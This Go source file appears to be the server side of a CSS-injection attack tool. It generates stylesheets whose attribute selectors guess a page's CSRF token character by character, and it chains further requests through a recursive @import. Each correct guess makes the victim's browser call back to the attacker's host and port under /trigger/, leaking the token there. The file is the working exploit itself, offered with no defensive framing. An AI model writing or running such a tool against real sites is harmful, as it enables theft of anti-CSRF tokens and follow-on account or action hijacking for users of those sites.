package server

import (
	"math/rand"
	"net/http"
	"strconv"
)

func Loop(writer http.ResponseWriter, KnowedPasswd [2]string, ipaddr string, port string) {
	payload := buildPayload(KnowedPasswd, ipaddr, port)
	SendRequest(writer, payload)
}

func buildPayload(KnowedPasswd [2]string, ipaddr string, port string) string {
	var payload, psswd string
	knowedPayloadSize := len(KnowedPasswd[0])
	random_number := strconv.Itoa(rand.Intn(1000000000000000))
	PayloadConstant := "@import url('https://" + ipaddr + ":" + port + "/requery" + random_number + ".css');"
	book := []string{
		"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
		"A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z",
		"1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
		"!", "\"", "#", "$", "%", "&", "(", ")", "*", "+", ",", "-", ".", "/", ":", ";", "<", "=", ">", "?", "@", "[", "]",
		"^", "_", "`", "{", "|", "}", "~", "é", "à", "è", "ù", "ç", "€", "£",
		// "\\","\\'",
	}

	CssProperties := [50][2]string{
		{"input{ background-image", ""}, {"input{ list-style-image", ""}, {"input{ content", ""}, {"input{ border-image-source", ""}, {"input{ shape-outside", ""}, {"input{ cursor", ", auto"}, {"input{ -webkit-mask-image", ""},
		{"form input{ background-image", ""}, {"form input{ list-style-image", ""}, {"form input{ content", ""}, {"form input{ border-image-source", ""}, {"form input{ shape-outside", ""}, {"form input{ cursor", ", auto"}, {"form input{ -webkit-mask-image", ""},
		{"div form input{ background-image", ""}, {"div form input{ list-style-image", ""}, {"div form input{ content", ""}, {"div form input{ border-image-source", ""}, {"div form input{ shape-outside", ""}, {"div form input{ cursor", ", auto"}, {"div form input{ -webkit-mask-image", ""},
		{"div div form input{ background-image", ""}, {"div div form input{ list-style-image", ""}, {"div div form input{ content", ""}, {"div div form input{ border-image-source", ""}, {"div div form input{ shape-outside", ""}, {"div div form input{ cursor", ", auto"}, {"div div form input{ -webkit-mask-image", ""},
		{"body div div form input{ background-image", ""}, {"body div div form input{ list-style-image", ""}, {"body div div form input{ content", ""}, {"body div div form input{ border-image-source", ""}, {"body div div form input{ shape-outside", ""}, {"body div div form input{ cursor", ", auto"}, {"body div div form input{ -webkit-mask-image", ""},
		{"html body div div form input{ background-image", ""}, {"html body div div form input{ list-style-image", ""}, {"html body div div form input{ content", ""}, {"html body div div form input{ border-image-source", ""}, {"html body div div form input{ shape-outside", ""}, {"html body div div form input{ cursor", ", auto"}, {"html body div div form input{ -webkit-mask-image", ""},
	}

	if KnowedPasswd[1] == "endcheck" {
		for _, chr := range book {
			psswd = chr + KnowedPasswd[0]
			payload = payload + "input[name=csrf][value$='" + psswd + "']{--s" + strconv.Itoa(knowedPayloadSize) + ": url(https://" + ipaddr + ":" + port + "/trigger/" + psswd + ")" + CssProperties[knowedPayloadSize][1] + ";}"
		}
	} else {
		knowedPayloadSize += 2
		for _, chr := range book {
			psswd = KnowedPasswd[0] + chr
			payload = payload + "input[name=csrf][value^='" + psswd + "']{--s" + strconv.Itoa(knowedPayloadSize) + ": url(https://" + ipaddr + ":" + port + "/trigger/" + psswd + ")" + CssProperties[knowedPayloadSize][1] + ";}"
		}
	}

	EndPayload := CssProperties[knowedPayloadSize][0] + ": var(--s" + strconv.Itoa(knowedPayloadSize) + ");}"

	fullPayload := PayloadConstant + payload + EndPayload
	return fullPayload
}

func SendRequest(writer http.ResponseWriter, payload string) {
	payload_bytes := []byte(payload)
	writer.Header().Set("Content-Type", "text/css")
	writer.Header().Set("Access-Control-Allow-Origin", "*")
	writer.Write(payload_bytes)
}
